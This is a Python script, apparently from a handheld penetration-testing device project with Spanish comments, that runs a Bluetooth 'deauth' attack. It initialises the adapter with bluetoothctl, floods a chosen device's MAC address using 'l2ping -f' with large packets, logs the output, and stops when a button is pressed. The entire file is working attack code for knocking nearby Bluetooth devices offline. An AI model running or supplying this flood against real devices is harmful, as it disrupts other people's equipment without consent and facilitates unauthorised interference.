#!/usr/bin/env python3
# tools/bt/bt_deauth.py

import subprocess
import time
import os
from display.screen import MenuDisplay
from config.gpio_config import read_buttons

def run_bt_deauth(name, mac, rssi):
  
    display = MenuDisplay()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    bt_reports = os.path.abspath(os.path.join(os.path.dirname(__file__), "/opt/beetle/reports/bt"))
    os.makedirs(bt_reports, exist_ok=True)
    logfile = os.path.join(bt_reports, f"deauth_{mac.replace(':','')}_{timestamp}.log")

    # Verificar si l2ping está instalado
    if subprocess.call(["which", "l2ping"], stdout=subprocess.DEVNULL) != 0:
        display.show_message(["Error:", "l2ping no encontrado"], center=True)
        time.sleep(3)
        return

    # Inicializar adaptador con bluetoothctl
    display.show_message(["Inicializando BT...", ""], center=True)
    try:
        proc_bt = subprocess.Popen(
            ["bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        init_cmds = ["power on", "agent on", "default-agent", "discoverable off", "pairable off"]
        for cmd in init_cmds:
            proc_bt.stdin.write(cmd + "\n")
            proc_bt.stdin.flush()
            time.sleep(0.3)
        proc_bt.stdin.write("exit\n")
        proc_bt.stdin.flush()
        proc_bt.terminate()
        proc_bt.wait()
    except Exception:
        display.show_message(["Error:", "init bluetoothctl"], center=True)
        time.sleep(3)
        return

    # Mensaje de inicio del ataque
    display.show_message([f"BT DEAUTH a {name[:12]}", f"{mac}",  "", "ENTER: Stop"], center=False)
    time.sleep(1)

    # Ejecutar ataque l2ping flood
    cmd = ["l2ping", "-f", "-s 600", "-i", "hci0", mac]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except Exception:
        display.show_message(["Error al", "ejecutar l2ping"], center=True)
        time.sleep(3)
        return

    start = time.time()
    last_display_lines = None  
    with open(logfile, "w") as logf:
        try:
            # Leemos la salida de l2ping y sólo actualizamos la pantalla cuando cambia
            while True:
                # Leer una línea de la salida 
                line = proc.stdout.readline()
                if line:
                    logf.write(line)
                    logf.flush()

              
                display_lines = [f"DEAUTH a {name[:12]}", "", "ENTER: Stop"]

                # Si la pantalla cambia respecto a la última mostrada, actualizamos
                if display_lines != last_display_lines:
                    display.show_message(display_lines, center=False)
                    last_display_lines = list(display_lines)

                # Chequear si el usuario pulsó ENTER para detener (respuesta rápida)
                if read_buttons()["enter"]:
                    break

                # pequeña espera para no saturar CPU y permitir reactividad al botón
                time.sleep(0.1)

        except KeyboardInterrupt:
            pass

    # Finalizar proceso
    try:
        proc.terminate()
    except Exception:
        pass
    try:
        proc.wait(timeout=2)
    except Exception:
        pass

    display.show_message(["   BT Deauth   ", "   terminado   "], center=True)
    time.sleep(2)
